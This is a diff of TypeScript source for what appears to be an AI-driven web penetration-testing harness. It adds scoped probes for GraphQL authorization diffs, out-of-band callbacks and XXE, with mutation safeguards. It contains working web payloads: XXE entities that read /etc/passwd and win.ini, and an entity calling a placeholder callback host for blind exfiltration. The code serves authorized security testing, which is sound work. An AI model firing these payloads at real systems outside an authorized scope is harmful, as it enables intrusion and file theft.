+      'Exercise ONE GraphQL operation end-to-end and compare it across roles — the per-operation counterpart of probe_graphql\'s endpoint meta-checks. Resolve the op by `operationName`/`operationKey` (a stored op on this screen — its observed variables replay automatically) or pass `document`+`variables` for an introspection-harvested op the crawler never saw. `variables` merges over the stored example; `setVariable`={path:"variables.input.ownerId",value:"42"} replaces ONE nested leaf keeping its JSON type (id swap — IDOR reads better through probe_idor\'s "json:" param on the same body though); `addVariables` creates new leaves (mass-assignment probes). `baselineRole` defaults to the current session ("unauth" = no session); `compareRole` replays the identical request under another role\'s session (attended/cookie-file roles only) for a field/operation-level authz diff. MUTATION POLICY (enforced in code, fail-closed): a mutation is only replayed when (a) `mutationAck` echoes the operation\'s exact name/key — an explicit opt-in bound to THIS operation — (b) `verifyQuery`+`verifyPath` designate the read query and state path on the AUTHORIZED TEST resource whose pre/post value proves each replay\'s write, and (c) its name doesn\'t read destructive (delete/transfer/… — those are never replayed here). A BASELINE IS ESTABLISHED FIRST: if the op\'s own request fails (syntax/validation/auth-denied/empty data) the whole check is reported UNVERIFIED — it is never counted as clean. Returns evidenceIds for every leg → record_finding(category idor / idor-write / info-disclosure / mass-assignment as appropriate).',
+      {
+        url: z.string(),
+        operationName: z.string().optional(),
+        operationKey: z.string().optional(),
+        document: z.string().optional(),
+        variables: z.record(z.unknown()).optional(),
+        setVariable: z.object({ path: z.string(), value: z.string() }).optional(),
+        addVariables: z.array(z.object({ path: z.string(), value: z.string() })).optional(),
+        baselineRole: z.string().optional(),
+        compareRole: z.string().optional(),
+        unauthControl: z.boolean().optional(),
+        mutationAck: z.string().optional(),
+        verifyQuery: z.object({ document: z.string(), operationName: z.string().optional(), variables: z.record(z.unknown()).optional() }).optional(),
+        verifyPath: z.string().optional(),
+        verifyExpect: z.string().optional(),
+        note: z.string().optional(),
+      },
+      async ({ url, operationName, operationKey, document, variables, setVariable, addVariables, baselineRole, compareRole, unauthControl, mutationAck, verifyQuery, verifyPath, verifyExpect, note }) => {
+        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
+        // ── Resolve the operation: stored inventory op first (its observed example vars make the replay real) ──
+        const apis = s.inv.screens().find((x) => x.screenId === s.currentScreenId)?.apis ?? [];
+        const stored = apis.map((a) => a.graphql).filter((g): g is NonNullable<typeof g> => !!g);
+        let op: (typeof stored)[number] | undefined;
+        if (operationKey) {
+          // An explicit key resolves EXACTLY — never fall back to a same-named op; a wrong-structure namesake
+          // is a different operation.
+          op = stored.find((g) => g.operationKey === operationKey);
+        } else if (operationName) {
+          const sameName = stored.filter((g) => g.operationName === operationName || g.operationKey.startsWith(`name:${operationName}:`));
+          if (sameName.length > 1 && !document)
+            return txt(
+              `ERROR: '${operationName}' is ambiguous — ${sameName.length} distinct operations share that name (different structures). Select one by operationKey: ${sameName.map((g) => g.operationKey).join(", ")}.`,
+            );
+          if (sameName.length === 1) op = sameName[0];
+        }
+        if (!op && document) {
+          op = describeGraphqlOperation(JSON.stringify({ query: document, ...(operationName ? { operationName } : {}) })) ?? undefined;
+        }
+        if (!op) {
+          const avail = apis.map((a) => a.graphql).filter((g) => !!g).map((g) => g!.operationName ?? g!.operationKey);
+          return txt(
+            `ERROR: no GraphQL operation matched (${[operationName, operationKey].filter(Boolean).join("/") || "none given"}). ` +
+              (avail.length ? `Stored ops on this screen: ${avail.join(", ")}.` : `This screen has no stored GraphQL operations — pass 'document' (e.g. from probe_graphql's introspection harvest) or observe the op via the browser first.`),
+          );
+        }
+        // ── Build the effective variables: observed example → caller merge → typed nested edits ──
+        // Deep-clone the merge result: setVariable/addVariables write NESTED leaves, and a shallow copy would
+        // mutate the stored variablesExample (inventory) and the caller's `variables` object alike — polluting
+        // the next baseline with this run's edits.
+        const vars: Record<string, unknown> = structuredClone({ ...(op.variablesExample ?? {}), ...(variables ?? {}) });
+        const touched: string[] = [];
+        if (setVariable) {
+          const path = setVariable.path.startsWith("variables.") || setVariable.path.startsWith("variables/") ? setVariable.path : `variables.${setVariable.path}`;
+          const leaf = readJsonPath({ variables: vars }, path);
+          if (!leaf.found) return txt(`ERROR: setVariable path '${setVariable.path}' does not exist in the observed variables (replace-only). Known id-bearing leaves: ${graphqlIdLeafPaths(vars).map((l) => l.pointer).join(", ") || "none"} — use addVariables to create a new field.`);
+          if (!writeJsonPath({ variables: vars }, path, coerceJsonLike(leaf.value, setVariable.value))) return txt(`ERROR: could not set '${path}'.`);
+          touched.push(path);
+        }
+        for (const add of addVariables ?? []) {
+          const path = add.path.startsWith("variables.") || add.path.startsWith("variables/") ? add.path : `variables.${add.path}`;
+          let v: unknown = add.value;
+          try {
+            v = JSON.parse(add.value); // numbers/booleans/objects stay typed — a string "42" into an Int field would be a type error, not evidence
+          } catch {
+            /* keep the raw string */
+          }
+          if (!writeJsonPath({ variables: vars }, path, v, { create: true })) return txt(`ERROR: could not add '${path}' (scalar in the way / bad path).`);
+          touched.push(`${path} (added)`);
+        }
+        const body = graphqlRequestBody({ document: op.document, operationName: op.operationName }, vars);
+        const opLabel = op.operationName ?? op.rootFields.join(",") ?? op.operationKey;
+        const headersFor = async (role: string | undefined): Promise<Record<string, string> | null> => {
+          if (role === undefined) return authHeaders(s); // current session
+          return roleAuthHeaders(s, role); // named role incl. "unauth" → {}
+        };
+        const baseH = await headersFor(baselineRole);
+        if (!baseH) return txt(`ERROR: cannot replay as role '${baselineRole}' — its session lives in the browser (credentials-only role). login('${baselineRole}') first, or use an attended/cookie-file role.`);
+        const send = async (headers: Record<string, string>, kind: "negative_control" | "positive_replay", tag: string, b: string = body, isolated = false) => {
+          const req: HttpRequest = {
+            method: "POST",
+            url,
+            headers: { ...headers, "content-type": "application/json", accept: "application/json" },
+            body: b,
+            // isolated legs (anonymous / another role) send ONLY their own headers — never the session's inherited ones
+            ...(isolated ? { inheritDefaultHeaders: false } : {}),
+          };
+          const res = await s.http.send(req);
+          bumpHttp(s, res.status);
+          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-graphql-op", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) }, response: res, note: `graphql-op ${opLabel} ${tag}${note ? ` (${note})` : ""}` });
+          return { evId: ev.id, status: res.status, body: res.body, gql: parseGraphqlResponse(res.status, res.body), transportError: undefined as string | undefined };
+        };
+        /** send() that converts a transport-level failure into a leg result — a failed replay is UNVERIFIED
+         *  evidence material, never "denied" and never an abort of the whole check. */
+        type Leg = { evId: string | null; status: number; body: string; gql: ReturnType<typeof parseGraphqlResponse>; transportError?: string };
+        const leg = async (headers: Record<string, string>, kind: "negative_control" | "positive_replay", tag: string, b: string = body, isolated = false): Promise<Leg> => {
+          try {
+            return await send(headers, kind, tag, b, isolated);
+          } catch (e) {
+            return { evId: null, status: 0, body: "", gql: parseGraphqlResponse(0, ""), transportError: String(e).slice(0, 120) };
+          }
+        };
+        try {
+          const isMutation = op.operationType === "mutation";
+          if (isMutation) {
+            // FAIL-CLOSED mutation gate — enforced in code, never inferred from a "harmless-looking" name:
+            //  (a) explicit opt-in BOUND to this operation: mutationAck must echo its operationName (or
+            //      operationKey for anonymous ops);
+            //  (b) verifyQuery + verifyPath designate the read query and the state path on the authorized test
+            //      resource — the mechanism that proves each replay's effect (and scopes the test to it);
+            //  (c) destructive vocabulary is refused outright even with the opt-in.
+            const opId = op.operationName ?? op.operationKey;
+            if (mutationAck !== opId)
+              return txt(
+                `ERROR: mutation '${opId}' requires explicit opt-in — pass mutationAck:"${opId}" to confirm this is a known non-destructive operation on an authorized test resource. Mutations are never replayed without it.`,
+              );
+            const bad = mutationLooksDestructive(op);
+            if (bad) return txt(`ERROR: '${bad}' reads as a destructive operation — probe_graphql_op refuses to replay destructive-looking mutations even with mutationAck. Use a non-destructive test mutation.`);
+            if (!verifyQuery || !verifyPath)
+              return txt(`ERROR: mutation '${opId}' requires verifyQuery (a read query on the test resource) + verifyPath (the state path whose pre→post change proves each replay). Without them a write cannot be verified or attributed — refusing to run blind.`);
+          }
+          // verifyQuery must be a real READ operation — enforced by parsing it, not by trusting the call site.
+          let verifyOp: NonNullable<ReturnType<typeof describeGraphqlOperation>> | null = null;
+          if (verifyQuery) {
+            verifyOp = describeGraphqlOperation(JSON.stringify({ query: verifyQuery.document, ...(verifyQuery.operationName ? { operationName: verifyQuery.operationName } : {}) }));
+            if (!verifyOp) return txt(`ERROR: verifyQuery document did not resolve to one unambiguous operation (bad syntax, unknown operationName, or multi-operation doc without a selector).`);
+            if (verifyOp.operationType !== "query") return txt(`ERROR: verifyQuery must be a read-only query — got '${verifyOp.operationType}'. A mutation/subscription cannot observe state safely.`);
+            if (isMutation && !verifyPath) return txt(`ERROR: verifyPath is required for mutation verification — name the state path inside data (e.g. "note.status") whose pre→post change proves the write.`);
+          }
+          let verifyExpected: unknown;
+          if (verifyExpect !== undefined) {
+            try {
+              verifyExpected = JSON.parse(verifyExpect);
+            } catch {
+              verifyExpected = verifyExpect; // plain string expectation
+            }
+          }
+          // Never replay a redacted placeholder as if it were a real baseline value.
+          const redacted = redactedVariablePaths(vars);
+          if (redacted.length) return txt(`ERROR: variables still contain masked placeholders at ${redacted.join(", ")} — inventory stores secrets only masked, so the real value is not on disk. Pass the real value via 'variables' or 'setVariable'.`);
+          // An explicitly named baselineRole (incl. "unauth") is an isolated identity: ALL its legs — baseline
+          // AND the verify reads that attribute its writes — send only its own headers. The default
+          // (undefined) is the current session, which legitimately inherits the client's configured headers.
+          const baseIso = baselineRole !== undefined;
+          const vb = verifyOp ? graphqlRequestBody({ document: verifyOp.document, operationName: verifyOp.operationName }, verifyQuery!.variables) : null;
+          const verifyRead = (tag: string) => leg(baseH, "positive_replay", tag, vb!, baseIso);
+          // ── Baseline MUST execute before anything else is claimed ──
+          const base = await send(baseH, "positive_replay", "baseline", body, baseIso);
+          // Response keys = the keys actually present in `data` (alias-or-field-name), fragment spreads expanded.
+          const bv = baselineVerdict(base.gql, op.responseKeys ?? op.rootFields);
+          if (!bv.established)
+            return txt(
+              JSON.stringify({
+                operation: opLabel,
+                operationType: op.operationType,
+                baseline: { evidenceId: base.evId, status: base.status, kind: base.gql.kind, errors: base.gql.errors.slice(0, 3).map((e) => e.message) },
+                verdict: `UNVERIFIED — baseline not established: ${bv.reason}. This is NOT a clean result; the operation never ran with valid args/auth/data, so nothing about its authz/injection surface is known. Fix the inputs (real variables, a role with access, an existing object) and re-run.`,
+              }),
+            );
+          if (!compareRole)
+            return txt(
+              JSON.stringify({
+                operation: opLabel,
+                operationType: op.operationType,
+                baseline: { evidenceId: base.evId, status: base.status, kind: base.gql.kind, partial: bv.partial, returnedFields: bv.returnedFields, ...(touched.length ? { variableEdits: touched } : {}) },
+                verdict: `BASELINE OK (${bv.partial ? "partial — some fields errored" : "clean"}) as ${baselineRole ?? s.currentRole ?? "current session"}: fields [${bv.returnedFields.join(", ")}] resolved. Pass compareRole to authz-diff this op across roles, or setVariable a known other-user id for an object-level check.`,
+              }),
+            );
+          // ── Authz diff: same request under (a) no auth — the enforcement control — and (b) compareRole ×2 ──
+          const evIds: { negativeControl?: string; positiveReplays: string[] } = { positiveReplays: [base.evId] };
+          let unauthR: Leg | null = null;
+          if (unauthControl !== false) {
+            unauthR = await leg({}, "negative_control", "unauth control", body, true);
+            evIds.negativeControl = unauthR.evId ?? undefined;
+          }
+          const cmpH = await roleAuthHeaders(s, compareRole);
+          if (!cmpH) return txt(`ERROR: cannot replay as '${compareRole}' — credentials-only role (no live/cookie session). login('${compareRole}') then re-run with baselineRole='${compareRole}'.`);
+          // Mutation attribution is PER-REPLAY: each compare replay is bracketed by its own verify-read pair
+          // (under the baseline identity, which can observe the resource), so a replay is attributed only when
+          // ITS pre→post state moved. Baseline's own write earlier in the sequence can no longer masquerade as
+          // compare's — and we never reset state to fake a second delta.
+          // State attribution reads ONLY the caller-named path inside `data` — unrelated dynamic fields in the
+          // response (clocks, totals, other objects) can't fabricate or hide the write's effect.
+          const stateAt = (gql: ReturnType<typeof parseGraphqlResponse>): { found: boolean; value: unknown } => {
+            const p = `data.${verifyPath!.replace(/^data[./]/, "")}`;
+            const r = readJsonPath({ data: gql.data ?? {} }, p);
+            return { found: r.found, value: r.value };
+          };
+          // A verify read is reliable ONLY if no error path intersects verifyPath (the path itself, an ancestor
+          // of it, or a descendant). {note:{status:null}} + INTERNAL_SERVER_ERROR at ["note","status"] is a
+          // FAILED read of that path — comparing its null to a later value fabricates a delta.
+          const verifySegs = verifyPath ? verifyPath.replace(/^data[./]/, "").split(/[./]/).filter(Boolean) : [];
+          const pathIntersects = (errPath: Array<string | number> | undefined): boolean => {
+            if (!errPath || verifySegs.length === 0) return false;
+            const segs = errPath.map(String);
+            const n = Math.min(segs.length, verifySegs.length);
+            for (let i = 0; i < n; i++) if (segs[i] !== verifySegs[i]) return false;
+            return true;
+          };
+          const reliableRead = (gql: ReturnType<typeof parseGraphqlResponse>): boolean =>
+            (gql.kind === "ok" || gql.kind === "partial") && !gql.errors.some((e) => pathIntersects(e.path));
+          const verifyEvIds: string[] = [];
+          const replays: Array<{ c: Leg; attributed: boolean | null }> = [];
+          for (const i of [1, 2]) {
+            let pre: Leg | null = null;
+            let attributed: boolean | null = null;
+            if (isMutation && vb) {
+              pre = await verifyRead(`verify pre replay #${i}`);
+              if (pre.evId) verifyEvIds.push(pre.evId);
+            }
+            const c = await leg(cmpH, "positive_replay", `as ${compareRole} #${i}`, body, true);
+            if (c.evId) evIds.positiveReplays.push(c.evId);
+            if (isMutation && vb && pre) {
+              const post = await verifyRead(`verify post replay #${i}`);
+              if (post.evId) verifyEvIds.push(post.evId);
+              // Both reads must be RELIABLE at the verify path — ok/partial AND no error on the path itself,
+              // an ancestor, or a descendant. Otherwise the "delta" is just a failed read, not a state change.
+              if (reliableRead(pre.gql) && reliableRead(post.gql)) {
+                const pv = stateAt(pre.gql);
+                const qv = stateAt(post.gql);
+                const moved = pv.found !== qv.found || JSON.stringify(pv.value) !== JSON.stringify(qv.value);
+                // expected-effect check: when verifyExpect names the post value it must match, or the observed
+                // change isn't proof the intended operation executed.
+                attributed = moved && (verifyExpected === undefined || JSON.stringify(qv.value) === JSON.stringify(verifyExpected));
+              } else {
+                attributed = null; // a verify read itself failed → the delta cannot be attributed either way
+              }
+            }
+            replays.push({ c, attributed });
+          }
+          const [c1, c2] = [replays[0]!.c, replays[1]!.c];
+          // Query reads must be byte-stable; mutation responses may differ legitimately (fresh ids/timestamps),
+          // so mutations only need the same status + envelope kind.
+          const stable = c1.status === c2.status && c1.gql.kind === c2.gql.kind && (isMutation ? true : c1.body === c2.body);
+          const diff = fieldDiff(base.gql, c1.gql);
+          // Operation-level denial requires a REAL authorization signal: authzDenied (FORBIDDEN /
+          // UNAUTHENTICATED / 401 / 403 / authz-worded message) on an errors-only or non-GraphQL response.
+          // data+errors (partial) is NOT a denial — field-level authz is handled below.
+          const otherDenied = c1.gql.authzDenied && c1.gql.kind !== "ok" && c1.gql.kind !== "partial";
+          // Errors-only / empty / non-GraphQL WITHOUT authz semantics: validation failure, resolver exception,
+          // INTERNAL_SERVER_ERROR, transport failure — none of these establish enforcement OR a bypass.
+          const cmpInconclusive =
+            !otherDenied &&
+            (c1.transportError !== undefined || c1.gql.kind === "errors" || c1.gql.kind === "empty" || c1.gql.kind === "not-graphql");
+          const unauthOk = unauthR ? unauthR.gql.kind === "ok" || unauthR.gql.kind === "partial" : null;
+          const attributedCount = replays.filter((r) => r.attributed === true).length;
+          const attributionUnknown = replays.some((r) => r.attributed === null);
+          let verdict: string;
+          if (!stable) verdict = `UNSTABLE — the two '${compareRole}' replays disagree; cannot conclude.`;
+          else if (otherDenied)
+            verdict = `ACCESS HELD — '${compareRole}' was denied (${c1.gql.errors[0]?.message ?? `status ${c1.status}`}). Operation-level authz enforces. Not a finding; mark this op tested-clean for ${compareRole}.`;
+          else if (cmpInconclusive)
+            verdict = `UNVERIFIED for '${compareRole}' — ${c1.transportError ? `transport failure (${c1.transportError})` : `response kind=${c1.gql.kind} without an authorization-denial signal (${c1.gql.errors[0]?.message ?? "no error detail"})`}. A validation error, resolver exception or empty body is NOT enforcement and NOT a bypass — fix inputs or inspect the endpoint before concluding anything.`;
+          else if (unauthOk === true)
+            verdict = `UNAUTHENTICATED ACCESS — the SAME operation returned data with NO session (unauth control, header-level anonymity only — transport identity like IP-allowlists/mTLS cannot be excluded by this probe). This is not a role-boundary issue: the data is publicly reachable (record_finding info-disclosure / auth-bypass only if the data is actually private — public reads are by design).`;
+          else if (diff.extraForOther.length > 0)
+            verdict = `PRIVILEGE INVERSION SIGNAL — '${compareRole}' received fields the baseline did NOT: [${diff.extraForOther.join(", ")}]. Verify '${compareRole}' is genuinely lower-privileged (role descriptions / verified ownership) before recording idor/idor-write.`;
+          else if (diff.deniedForOther.length > 0 || diff.errorFieldsForOther.length > 0)
+            verdict = `FIELD-LEVEL AUTHZ — under '${compareRole}', ${[...diff.deniedForOther.map((f) => `${f} (absent)`), ...diff.errorFieldsForOther.map((f) => `${f} (authz error)`)].join(", ") || "no fields"} were denied while [${diff.otherFields.join(", ") || "none"}] resolved. Restriction working on the denied fields; if the resolved ones are privileged, that subset is the finding.${diff.failedFieldsForOther.length ? ` NOTE: [${diff.failedFieldsForOther.join(", ")}] failed with NON-authz errors (resolver/internal) — those prove nothing either way.` : ""}`;
+          else if (diff.failedFieldsForOther.length > 0)
+            verdict = `UNVERIFIED (field-level) — under '${compareRole}', [${diff.failedFieldsForOther.join(", ")}] failed to resolve with NON-authorization errors (resolver/internal/timeout). Not enforcement, not a bypass — but [${diff.otherFields.join(", ") || "none"}] still resolved, so judge those fields on their own.`;
+          else if (isMutation && vb && attributedCount === 2)
+            verdict = `MUTATION EXECUTED — EACH '${compareRole}' replay independently moved observed state at verifyPath '${verifyPath}' (per-replay pre→post delta; reads erroring on that path are treated as unknowable, not as deltas). Function-level authz broken IF '${compareRole}' shouldn't hold this operation — record_finding idor-write (or business-logic class) citing the replay + verify evidenceIds.`;
+          else if (isMutation && vb && attributedCount > 0)
+            verdict = `UNVERIFIED — only ${attributedCount}/2 '${compareRole}' replays produced an attributable state change (idempotent repeat or the replay body no-ops). Re-run with a per-replay-varying value; do not count as executed or as held.`;
+          else if (isMutation && vb && attributionUnknown)
+            verdict = `UNVERIFIED — a verify read failed around a '${compareRole}' replay, so state attribution is unknowable. Not clean, not executed.`;
+          else if (isMutation && vb)
+            verdict = `MUTATION ACCEPTED (data returned) under '${compareRole}' but NEITHER replay's verify read showed a state change — a no-op/dry-run response, not an executed write. Unverified as a vuln; check the op semantics.`;
+          else if (isMutation && !vb)
+            verdict = `UNVERIFIED — '${compareRole}' mutation replays returned data, but no verifyQuery was supplied, so no state change can be attributed. Pass verifyQuery (a read query on the touched resource) to prove execution.`;
+          else
+            verdict = `SAME ACCESS — '${compareRole}' received the same fields as the baseline (${diff.otherFields.join(", ")}). This is only a finding if (a) '${compareRole}' is verifiably lower-privileged AND (b) the fields are privileged. Shared/public data readable by both roles is NOT an authz failure — judge from role descriptions and confirmed ownership before recording.`;
+          return txt(
+            JSON.stringify({
+              operation: opLabel,
+              operationType: op.operationType,
+              baseline: { role: baselineRole ?? s.currentRole ?? "current", evidenceId: base.evId, status: base.status, partial: bv.partial, fields: bv.returnedFields },
+              unauthControl: unauthR ? { evidenceId: unauthR.evId, status: unauthR.status, kind: unauthR.gql.kind, dataReturned: unauthOk, ...(unauthR.transportError ? { transportError: unauthR.transportError } : {}) } : "skipped",
+              compare: { role: compareRole, status: c1.status, kind: c1.gql.kind, fields: diff.otherFields, deniedFields: diff.deniedForOther, extraFields: diff.extraForOther, errorFields: diff.errorFieldsForOther, ...(diff.failedFieldsForOther.length ? { failedFields: diff.failedFieldsForOther } : {}), replays: [c1.evId, c2.evId], stable },
+              ...(vb ? { verifyQuery: { perReplayAttribution: replays.map((r) => r.attributed), evidenceIds: verifyEvIds } } : {}),
+              ...(touched.length ? { variableEdits: touched } : {}),
+              evidenceIds: evIds,
+              verdict,
             }),
           );
         } catch (e) {
@@ -3179,6 +4170,8 @@ export function buildTools(s: PilotSession) {
         mutated: z.object({ method: z.string(), url: z.string(), headers: z.record(z.string()).optional(), body: z.string().nullable().optional() }),
         effectMarker: z.string(),
         note: z.string().optional(),
+        /** Plan class this test exercises (e.g. price-tampering / mass-assignment) — attributes the coverage-ledger row. */
+        checkClass: z.string().optional(),
       },
       async ({ baseline, mutated, effectMarker, note }) => {
         for (const u of [baseline.url, mutated.url]) if (!isInScope(u, s.scope)) return txt(`BLOCKED: ${u} is out of scope`);
@@ -3195,7 +4188,7 @@ export function buildTools(s: PilotSession) {
             screenId: s.currentScreenId ?? "pilot",
             validator: "claude-pilot-logic",
             kind,
-            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
+            request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) },
             response: res,
             note: note ? `${note} (${tag})` : tag,
           });
@@ -3283,7 +4276,7 @@ export function buildTools(s: PilotSession) {
             screenId: s.currentScreenId ?? "pilot",
             validator: "claude-pilot-stored-xss",
             kind,
-            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
+            request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) },
             response: res,
             note: `stored-xss render ${tag}`,
           });
@@ -3350,7 +4343,7 @@ export function buildTools(s: PilotSession) {
           const req: HttpRequest = { method: method.toUpperCase(), url, headers: hdr, body: bdy };
           const res = await s.http.send(req);
           bumpHttp(s, res.status);
-          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-csrf", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers) }, response: res, note: `csrf ${tag}` });
+          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-csrf", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) }, response: res, note: `csrf ${tag}` });
           return { evId: ev.id, status: res.status };
         };
         let ctrl: Awaited<ReturnType<typeof fire>>;
@@ -3389,7 +4382,7 @@ export function buildTools(s: PilotSession) {
     tool(
       "probe_oob",
       "Confirm a BLIND / out-of-band vuln via Interactsh or Burp Collaborator: blind SSRF, blind XXE, blind SQLi (DNS/HTTP exfil), OS command injection, header SSRF (X-Forwarded-Host / Referer / Host), email/webhook SSRF — anything where the EFFECT is the SERVER making an external request, not a visible response. Requires OOB enabled (Settings → OOB → Interactsh, or BURP_AUDIT_API + Collaborator). Put a {{OOB}} placeholder where the callback host belongs (a URL field, an XXE SYSTEM entity `<!ENTITY x SYSTEM \"http://{{OOB}}/\">`, a hostname, a header value, OR inside an uploaded file's text content — see `files`). The tool generates a unique callback host, injects it (in-scope target request), and polls ~waitSec for a DNS/HTTP/SMTP callback FROM the target; a callback = the server reached our host out-of-band = confirmed. FILE-BORNE OOB: for a blind SSRF/XXE that must live INSIDE an uploaded file (FFmpeg/HLS video-SSRF, ImageMagick, an uploaded SVG/DOCX with a SYSTEM entity), pass `files` (each {name, filename, contentType?, and `content` text OR `base64` bytes}) with {{OOB}} in a file's text `content` — it is sent as multipart/form-data and the callback confirms the file-borne case. Records a benign control + the injected request → negativeControl + positiveReplays evidenceIds for record_finding(category ssrf / rce as appropriate). NOTE: callbacks can lag seconds; nothing back after waitSec = not confirmed (try other params/headers/schemes).",
-      { method: z.string(), url: z.string(), headers: z.record(z.string()).optional(), body: z.string().nullable().optional(), files: z.array(z.object({ name: z.string(), filename: z.string(), contentType: z.string().optional(), content: z.string().optional(), base64: z.string().optional() })).optional(), waitSec: z.number().optional(), note: z.string().optional() },
+      { method: z.string(), url: z.string(), headers: z.record(z.string()).optional(), body: z.string().nullable().optional(), files: z.array(z.object({ name: z.string(), filename: z.string(), contentType: z.string().optional(), content: z.string().optional(), base64: z.string().optional() })).optional(), waitSec: z.number().optional(), note: z.string().optional(), checkClass: z.string().optional().describe("plan class under test (ssrf / xxe / rce / sqli blind) — attributes the coverage-ledger row") },
       async ({ method, url, headers, body, files, waitSec, note }) => {
         if (!s.oob) return txt("OOB NOT AVAILABLE: enable OOB in Settings (Interactsh) or set BURP_AUDIT_API (Burp Collaborator). Without it, blind SSRF/XXE/SQLi cannot be confirmed out-of-band. In-band probe_ssrf still applies.");
         const oob = s.oob;
@@ -3419,7 +4412,7 @@ export function buildTools(s: PilotSession) {
             screenId: s.currentScreenId ?? "pilot",
             validator: "claude-pilot-oob",
             kind,
-            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
+            request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) },
             response: { ...res, body: `[VERDICT-OOB] ${resultBody}` },
             note: note ? `${note} (oob)` : "oob",
           });
@@ -3509,7 +4502,7 @@ export function buildTools(s: PilotSession) {
             screenId: s.currentScreenId ?? "pilot",
             validator: "claude-pilot-ssrf",
             kind,
-            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
+            request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) },
             response: res,
             note: `ssrf ${tag}`,
           });
@@ -3590,7 +4583,7 @@ export function buildTools(s: PilotSession) {
             screenId: s.currentScreenId ?? "pilot",
             validator: "claude-pilot-upload",
             kind,
-            request: { ...req, headers: s.http.effectiveHeaders(req.headers), body: evBody },
+            request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false), body: evBody },
             response: res,
             note: `upload ${tag}`,
           });
@@ -3605,7 +4598,7 @@ export function buildTools(s: PilotSession) {
             screenId: s.currentScreenId ?? "pilot",
             validator: "claude-pilot-upload",
             kind,
-            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
+            request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) },
             response: res,
             note: `upload-fetch ${tag}`,
           });
@@ -3704,6 +4697,7 @@ export function buildTools(s: PilotSession) {
         exploit: z.array(z.object({ method: z.string(), url: z.string(), headers: z.record(z.string()).optional(), body: z.string().nullable().optional(), capture: z.record(z.string()).optional() })).min(1),
         effectMarker: z.string(),
         note: z.string().optional(),
+        checkClass: z.string().optional().describe("plan class under test (price-tampering / workflow-bypass / mass-assignment …) — attributes the coverage-ledger row"),
       },
       async ({ control, exploit, effectMarker, note }) => {
         type Step = { method: string; url: string; headers?: Record<string, string>; body?: string | null; capture?: Record<string, string> };
@@ -3739,7 +4733,7 @@ export function buildTools(s: PilotSession) {
               screenId: s.currentScreenId ?? "scenario",
               validator: "claude-pilot-scenario",
               kind,
-              request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
+              request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) },
               response: res,
               note: `${note ? note + " " : ""}${tag} · step ${i + 1}/${steps.length} ${req.method} ${url}`,
             });
@@ -3789,8 +4783,1012 @@ export function buildTools(s: PilotSession) {
       },
     ),
     tool(
+      "probe_xxe",
+      "Confirm an INLINE XXE on an XML-accepting endpoint (raw body, form param, or bodyTemplate with {{X}} where the XML doc lands — encode with 'raw'|'url'|'json'). Sends: (1) CONTROL = well-formed XML, no entities; (2) internal-entity CANARY = a unique marker entity that must expand inline to prove the parser resolves entities; (3) two FILE-READ legs = <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> and \"file:///c:/windows/win.ini\" whose file content (root:x:0:0 / [fonts]) must appear in the response. File content in BOTH read legs → CONFIRMED xxe (negativeControl=control, positiveReplays=the two reads). Canary expands but no file content = suspected LEAD only (entity expansion observed; exfil path unproven). No expansion at all = blind or disabled — hand off to probe_oob for OOB-XXE. Multipart file uploads → probe_upload/probe_oob files instead.",
+      {
+        url: z.string(),
+        method: z.string().optional().describe("default POST"),
+        param: z.string().optional().describe("form field carrying the XML (url-encoded body)"),
+        fields: z.record(z.string()).optional().describe("extra form fields alongside param"),
+        bodyTemplate: z.string().optional().describe("full request body with {{X}} where the XML document is substituted"),
+        encode: z.enum(["raw", "url", "json"]).optional().describe("how {{X}} is embedded — default raw; json escapes quotes/backslashes"),
+        contentType: z.string().optional().describe("default application/xml (or application/x-www-form-urlencoded when param is given)"),
+      },
+      async ({ url, method, param, fields, bodyTemplate, encode, contentType }) => {
+        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
+        const meth = (method ?? "POST").toUpperCase();
+        const tok = `vXxe${Date.now().toString(36)}${Math.floor(Math.random() * 1e6).toString(36)}`;
+        const enc = encode ?? "raw";
+        const embed = (xml: string): string => {
+          if (bodyTemplate) {
+            const val = enc === "url" ? encodeURIComponent(xml) : enc === "json" ? xml.replace(/\\/g, "\\\\").replace(/"/g, '\\"').replace(/\n/g, "\\n") : xml;
+            return bodyTemplate.split("{{X}}").join(val);
+          }
+          if (param) {
+            const extra = Object.entries(fields ?? {}).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`);
+            return [...extra, `${encodeURIComponent(param)}=${encodeURIComponent(xml)}`].join("&");
+          }
+          return xml;
+        };
+        const ct = contentType ?? (param ? "application/x-www-form-urlencoded" : "application/xml");
+        const xmlCtrl = `<?xml version="1.0"?><v>${tok}</v>`;
+        const xmlCanary = `<?xml version="1.0"?><!DOCTYPE v [<!ENTITY c "${tok}">]><v>&c;</v>`;
+        const xmlPasswd = `<?xml version="1.0"?><!DOCTYPE v [<!ENTITY f SYSTEM "file:///etc/passwd">]><v>&f;</v>`;
+        const xmlWinini = `<?xml version="1.0"?><!DOCTYPE v [<!ENTITY f SYSTEM "file:///c:/windows/win.ini">]><v>&f;</v>`;
+        // Fallback exfil vectors — XInclude (no DOCTYPE needed) and a parameter-entity error probe
+        // (file content surfaces inside the parser's own error text on some stacks).
